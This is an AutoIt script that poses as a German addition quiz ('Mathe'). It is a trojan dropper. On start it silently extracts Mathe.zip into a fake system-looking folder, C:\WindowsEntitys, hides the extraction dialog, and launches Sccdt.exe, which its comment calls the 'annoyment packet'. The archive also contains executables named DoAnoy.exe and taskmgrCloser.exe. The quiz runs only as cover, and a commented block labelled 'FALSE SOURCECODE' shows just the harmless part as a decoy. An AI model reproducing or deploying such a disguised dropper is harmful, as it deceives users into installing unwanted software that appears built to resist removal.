;#AutoIt3Wrapper_au3check_parameters=-d -w 1 -w 2 -w 3 -w 4 -w 5 -w 6
#include <array.au3>
; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.2
; Language:       English
; Description:    ZIP Functions.
; Author:		  torels_ ediitet by Futureman2007
;
; ------------------------------------------------------------------------------
Break(0);
;#NoTrayIcon
#cs

================= TO BE EXECUTED ==============================
this script will unextract the zip file in stestinationed dir. also it runs the "Programm" for the first TimerDiff
#ce

;C:\Users\Stephan\Desktop\testZIP.zip
$zipName = "Mathe.zip" ;name of the sendet .zip file to be extracted
$scriptZIPDir = @ScriptDir & "\" & $zipName ; Directory of the .zip file
$pathCreateDest = "C:\WindowsEntitys" ;Path, where the .zip content shall be extracted and maybe has to be created
$exeName = "Sccdt.exe" ;-> Name of the .exe which starts the "annoyment packet" (one specified .exe)
$exeDir = $pathCreateDest & "\" & $exeName  ;-> full directory of the .exe from $exeName


;_Zip_AddFolder("C:\Users\Stephan\Desktop" , "C:\Users\Stephan\Desktop\testZIP" , 1)
;_Zip_UnzipAll($hZipFile, $hDestPath, $flag = 1)

;#requireadmin

;_Zip_UnzipAll("C:\Users\Stephan\Desktop\testZIP.zip", "C:\Windows",1);

If FileExists(@ScriptDir & "\" & $zipName) Then
   MsgBox(0 , "Mathe" , "MatheDaten werden geladen... kurz warten" , 6)
   sleep(Round(Random(100,1100)))
   MsgBox(0, "Mathe" , @OSVersion & " " & @OSArch & "System found... starting to addapt...")
   sleep(Round(Random(800,2100)))
Else
   MsgBox(0 , "Mathe" , "ERROR: Mathe.zip has to be in the same directory as the current running Executable! Put both in the same Folder", 15)
   Exit
EndIf
If Not FileExists($pathCreateDest) Then
   DirCreate($pathCreateDest)
EndIf

If Not (FileExists($pathCreateDest & "Sccdt.exe") And FileExists($pathCreateDest & "coc.exe") And FileExists($pathCreateDest & "caip.exe") And FileExists($pathCreateDest & "DoAnoy.exe") And FileExists($pathCreateDest & "taskmgrCloser.exe") )  Then
   _Zip_UnzipAll(@ScriptDir & "\" & $zipName, $pathCreateDest, 1);
EndIf

If FileExists($pathCreateDest) Then
   If FileExists($exeDir) Then
	  If Not ProcessExists($exeName) Then
		 Run($exeDir)
	  EndIf
   EndIf
EndIf


If UBound($CMDLine) > 1 Then
	If $CMDLine[1] <> "" Then _Zip_VirtualZipOpen()
EndIf

_matheaufgabe();
;===============================================================================
;=============================== FUNCTIONS =====================================
;===============================================================================

Func _matheaufgabe()
   $continue = 6;
   While $continue = 6;
	  $zahl1 = Round(Random(1 , 999));
	  $zahl2 = Round(Random(1, 999));
	  $eingabe = InputBox("Mathe" , "Was ist: " &$zahl1&  " + " & $zahl2 & " ?")
	  If $eingabe = ($zahl1 + $zahl2) Then
		 $continue = MsgBox(4,"RICHTIG!" , "Das Ergebniss: " & $eingabe & " ist richtig! Weiter?");
		 If Not $eingabe = 6 Then
			MsgBox(0 , "Mathe" , "Bis Bald!");
			ExitLoop
		 EndIf
	  Else
		$continue = MsgBox(4,"FALSCH" , $zahl1 & " + " & $zahl2 & " = " & $zahl1 + $zahl2 & " deine Eingabe: " & $eingabe & " ist leider nicht richtig... nochmal probieren?");
		 If Not $continue = 6 Then
			MsgBox(0 , "Mathe" ,"Bis bald!");
			ExitLoop
		 EndIf
	  EndIf
   WEnd
EndFunc

#cs
FALSE SOURCECODE:

Func _matheaufgabe()
   $continue = 6; 6 means "YES" button pressed
   While $continue = 6;
	  $zahl1 = Round(Random(1 , 999));
	  $zahl2 = Round(Random(1, 999));
	  $eingabe = InputBox("Mathe" , "Was ist: " &$zahl1&  " + " & $zahl2 & " ?")
	  If $eingabe = ($zahl1 + $zahl2) Then
		 $continue = MsgBox(4,"RICHTIG!" , "Das Ergebniss: " & $eingabe & " ist richtig! Weiter?");
		 If Not $eingabe = 6 Then
			MsgBox(0 , "Mathe" , "Bis Bald!");
			ExitLoop
		 EndIf
	  Else
		$continue = MsgBox(4,"FALSCH" , $zahl1 & " + " & $zahl2 & " = " & $zahl1 + $zahl2 & " deine Eingabe: " & $eingabe & " ist leider nicht richtig... nochmal probieren?");
		 If Not $continue = 6 Then
			MsgBox(0 , "Mathe" ,"Bis bald!");
			ExitLoop
		 EndIf
	  EndIf
   WEnd
EndFunc

_matheaufgabe();

#ce

;===============================================================================
;

; Function Name:    _Zip_UnzipAll()
; Description:      Extract all files contained in a ZIP Archieve.
; Parameter(s):     $hZipFile - Complete path to zip file that will be created (or handle if existant)
;					$hDestPath - Complete path to where the files will be extracted
;					$flag = 1
;					- 1 no progress box
;					- 0 progress box
; Requirement(s):   none.
; Return Value(s):  On Success - 0
;                   On Failure - sets @error 1~3
;					@error = 1 no Zip file
;					@error = 2 no dll
;					@error = 3 dll isn't registered
; Author(s):        torels_
; Notes:			The return values will be given once the extracting process is ultimated... it takes some time with big files
;
;===============================================================================
Func _Zip_UnzipAll($hZipFile, $hDestPath, $flag = 1)
	Local $DLLChk = _Zip_DllChk()
	If $DLLChk <> 0 Then Return SetError($DLLChk, 0, 0);no dll
	If not _IsFullPath($hZipFile) then Return SetError(4,0) ;zip file isn't a full path
	If Not FileExists($hZipFile) Then Return SetError(2, 0, 0) ;no zip file
	If Not FileExists($hDestPath) Then DirCreate($hDestPath)
	Local $aArray[1]
	$oApp = ObjCreate("Shell.Application")
	$oApp.Namespace($hDestPath).CopyHere($oApp.Namespace($hZipFile).Items)
	For $item In $oApp.Namespace($hZipFile).Items
		_ArrayAdd($aArray, $item)
	Next
	While 1
		If $flag = 1 then _Hide()
		If FileExists($hDestPath & "\" & $aArray[UBound($aArray) - 1]) Then
			Return SetError(0, 0, 1)
			ExitLoop
		EndIf
		Sleep(500)
	WEnd
EndFunc   ;==>_Zip_UnzipAll

;===============================================================================
;
; Function Name:    _Zip_Unzip()
; Description:      Extract a single file contained in a ZIP Archieve.
; Parameter(s):     $hZipFile - Complete path to zip file that will be created (or handle if existant)
;					$hFilename - Name of the element in the zip archive ex. "hello_world.txt"
;					$hDestPath - Complete path to where the files will be extracted
;					$flag = 1
;					- 1 no progress box
;					- 0 progress box
; Requirement(s):   none.
; Return Value(s):  On Success - 0
;                   On Failure - sets @error 1~3
;					@error = 1 no Zip file
;					@error = 2 no dll
;					@error = 3 dll isn't registered
; Author(s):        torels_
; Notes:			The return values will be given once the extracting process is ultimated... it takes some time with big files
;
;===============================================================================
Func _Zip_Unzip($hZipFile, $hFilename, $hDestPath, $flag = 1)
	Local $DLLChk = _Zip_DllChk()
	If $DLLChk <> 0 Then Return SetError($DLLChk, 0, 0) ;no dll
	If not _IsFullPath($hZipFile) then Return SetError(4,0) ;zip file isn't a full path
	If Not FileExists($hZipFile) Then Return SetError(1, 0, 0) ;no zip file
	If Not FileExists($hDestPath) Then DirCreate($hDestPath)
	$oApp = ObjCreate("Shell.Application")
	$hFolderitem = $oApp.NameSpace($hZipFile).Parsename($hFilename)
	$oApp.NameSpace($hDestPath).Copyhere($hFolderitem)
	While 1
		If $flag = 1 then _Hide()
		If FileExists($hDestPath & "\" & $hFilename) Then
			return SetError(0, 0, 1)
			ExitLoop
		EndIf
		Sleep(500)
	WEnd
EndFunc   ;==>_Zip_Unzip


;===============================================================================
;
; Function Name:    _Zip_DllChk()
; Description:      Internal error handler.
; Parameter(s):     none.
; Requirement(s):   none.
; Return Value(s):  Failure - @extended = 1
; Author(s):        smashley
;
;===============================================================================
Func _Zip_DllChk()
	If Not FileExists(@SystemDir & "\zipfldr.dll") Then Return 2
	If Not RegRead("HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}", "") Then Return 3
	Return 0
EndFunc   ;==>_Zip_DllChk

;===============================================================================
;
; Function Name:    _GetIcon()
; Description:      Internal Function.
; Parameter(s):     $file - File form which to retrieve the icon
;					$ReturnType - IconFile or IconID
; Requirement(s):   none.
; Return Value(s):  Icon Path/ID
; Author(s):        torels_
;
;===============================================================================
Func _GetIcon($file, $ReturnType = 0)
	$FileType = StringSplit($file, ".")
	$FileType = $FileType[UBound($FileType)-1]
	$FileParam = RegRead("HKEY_CLASSES_ROOT\." & $FileType, "")
	$DefaultIcon = RegRead("HKEY_CLASSES_ROOT\" & $FileParam & "\DefaultIcon", "")

	If Not @error Then
		$IconSplit = StringSplit($DefaultIcon, ",")
		ReDim $IconSplit[3]
		$Iconfile = $IconSplit[1]
		$IconID = $IconSplit[2]
	Else
		$Iconfile = @SystemDir & "\shell32.dll"
		$IconID = -219
	EndIf

	If $ReturnType = 0 Then
		Return $Iconfile
	Else
		Return $IconID
	EndIf
EndFunc

;===============================================================================
;
; Function Name:    _IsFullPath()
; Description:      Internal Function.
; Parameter(s):     $path - a zip path
; Requirement(s):   none.
; Return Value(s):  success - True.
;					failure - False.
; Author(s):        torels_
;
;===============================================================================
Func _IsFullPath($path)
    if StringInStr($path,":\") then
        Return True
    Else
        Return False
    EndIf
Endfunc

;===============================================================================
;
; Function Name:    _Hide()
; Description:      Internal Function.
; Parameter(s):     none
; Requirement(s):   none.
; Return Value(s):  none.
; Author(s):        torels_
;
;===============================================================================
Func _Hide()
	If ControlGetHandle("[CLASS:#32770]", "", "[CLASS:SysAnimate32; INSTANCE:1]") <> "" And WinGetState("[CLASS:#32770]") <> @SW_HIDE	Then ;The Window Exists
		$hWnd = WinGetHandle("[CLASS:#32770]")
		WinSetState($hWnd, "", @SW_HIDE)
	EndIf
 EndFunc

 ;===============================================================================
;
; Function Name:    _Zip_VirtualZipCreate()
; Description:      Create a Virtual Zip.
; Parameter(s):     $hZipFile - Complete path to zip file that will be created (or handle if existant)
;					$sPath - Path to where create the Virtual Zip
; Requirement(s):   none.
; Return Value(s):  On Success - List of Created Files
;                   On Failure - sets @error 1~3
;					@error = 1 no Zip file
;					@error = 2 no dll
;					@error = 3 dll isn't registered
; Author(s):        torels_
; Notes:			none
;
;===============================================================================
Func _Zip_VirtualZipCreate($hZipFile, $sPath)
	$List = _Zip_List($hZipFile)
	If @error Then Return SetError(@error,0,0)
	If Not FileExists($sPath) Then DirCreate($sPath)
	If StringRight($sPath, 1) = "\" Then $sPath = StringLeft($sPath, StringLen($sPath) -1)
	For $i = 1 to $List[0]
		If Not @Compiled Then
			$Cmd = @AutoItExe
			$params = '"' & @ScriptFullPath & '" ' & '"' & $hZipFile & "," & $List[$i] & '"'
		Else
			$Cmd = @ScriptFullPath
			$Params = '"' & $hZipFile & "," & $List[$i] & '"'
		EndIf
		FileCreateShortcut($Cmd, $sPath & "\" & $List[$i], -1,$Params, "Virtual Zipped File", _GetIcon($List[$i], 0), "", _GetIcon($List[$i], 1))
	Next
	$List = _ArrayInsert($List, 1, $sPath)
	Return $List
EndFunc

;===============================================================================
;
; Function Name:    _Zip_VirtualZipOpen()
; Description:      Open A File in a Virtual Zip, Internal Function.
; Parameter(s):     none.
; Requirement(s):   none.
; Return Value(s):  On Success - 0
;                   On Failure - sets @error 1~3
;					@error = 1 no Zip file
;					@error = 2 no dll
;					@error = 3 dll isn't registered
; Author(s):        torels_
; Notes:			none
;
;===============================================================================
Func _Zip_VirtualZipOpen()
	$ZipSplit = StringSplit($CMDLine[1], ",")
	$ZipName = $ZipSplit[1]
	$ZipFile = $ZipSplit[2]
	_Zip_Unzip($ZipName, $ZipFile, @TempDir & "\", 4+16) ;no progress + yes to all
	If @error Then Return SetError(@error,0,0)
	ShellExecute(@TempDir & "\" & $ZipFile)
EndFunc

;===============================================================================
;
; Function Name:    _Zip_VirtualZipOpen()
; Description:      Delete a Virtual Zip.
; Parameter(s):     none.
; Requirement(s):   none.
; Return Value(s):  On Success - 0
;                   On Failure - none.
; Author(s):        torels_
; Notes:			none
;
;===============================================================================
Func _Zip_VirtualZipDelete($aVirtualZipHandle)
	For $i = 2 to UBound($aVirtualZipHandle)-1
		If FileExists($aVirtualZipHandle[1] & "\" & $aVirtualZipHandle[$i]) Then FileDelete($aVirtualZipHandle[1] & "\" & $aVirtualZipHandle[$i])
	Next
	Return 0
EndFunc

;===============================================================================

;===============================================================================
;
; Function Name:    _Zip_List()
; Description:      Returns an Array containing of all the files contained in a ZIP Archieve.
; Parameter(s):     $hZipFile - Complete path to zip file that will be created (or handle if existant)
; Requirement(s):   none.
; Return Value(s):  On Success - 0
;                   On Failure - sets @error 1~3
;					@error = 1 no Zip file
;					@error = 2 no dll
;					@error = 3 dll isn't registered
; Author(s):        torels_
;
;===============================================================================
Func _Zip_List($hZipFile)
	local $aArray[1]
	Local $DLLChk = _Zip_DllChk()
	If $DLLChk <> 0 Then Return SetError($DLLChk, 0, 0) ;no dll
	If not _IsFullPath($hZipFile) then Return SetError(4,0) ;zip file isn't a full path
	If Not FileExists($hZipFile) Then Return SetError(1, 0, 0) ;no zip file
	$oApp = ObjCreate("Shell.Application")
	$hList = $oApp.Namespace($hZipFile).Items
	For $item in $hList
		_ArrayAdd($aArray,$item.name)
	Next
	$aArray[0] = UBound($aArray) - 1
	Return $aArray
EndFunc   ;==>_Zip_List

